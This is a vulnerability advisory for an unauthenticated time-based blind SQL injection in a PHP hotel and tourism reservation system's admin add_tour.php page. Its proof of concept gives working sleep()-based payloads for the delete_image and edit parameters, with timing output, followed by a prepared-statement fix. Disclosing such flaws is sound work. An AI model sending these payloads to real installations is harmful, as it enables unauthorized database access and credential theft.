# SQL Injection in Hotel and Tourism Reservation System PHP 1.0 — /admin/add_tour.php

## Affected Product Details
- **Product:** Hotel and Tourism Reservation In PHP
- **Version:** 1.0
- **Vendor:** https://code-projects.org/hotel-and-tourism-reservation-in-php-with-source-code/
- **Vulnerable File:** `/ht/admin/add_tour.php`
- **Vulnerable Parameters:** `delete_image`, `edit` (GET)
- **Authentication Required:** No
- **Attack Vector:** Remote
- **Vulnerability Type:** Time-based Blind SQL Injection (CWE-89)
- **CVSS v3.1 Score:** 7.5 (High)
- **CVSS v3.1 Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

## Proof of Concept

**Payload (GET — delete_image):**
```http
GET /ht/admin/add_tour.php?delete_image=(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'*/ HTTP/1.1
Host: TARGET
```

**Payload (GET — edit):**
```http
GET /ht/admin/add_tour.php?edit=40'XOR(4*if(now()=sysdate(),sleep(6),0))XOR'Z HTTP/1.1
Host: TARGET
```

**Time-based Confirmation:**
```
sleep(0)  =>  0.012s
sleep(3)  =>  3.015s
sleep(6)  =>  6.011s
sleep(15) => 15.005s
```

## Impact
An unauthenticated remote attacker can enumerate the entire database, extract credentials and sensitive data, and potentially achieve full system compromise.

## Remediation
```php
$stmt = $conn->prepare("SELECT * FROM tours WHERE id=?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

## References
- https://owasp.org/www-community/attacks/SQL_Injection
- https://cwe.mitre.org/data/definitions/89.html
- https://code-projects.org/hotel-and-tourism-reservation-in-php-with-source-code/
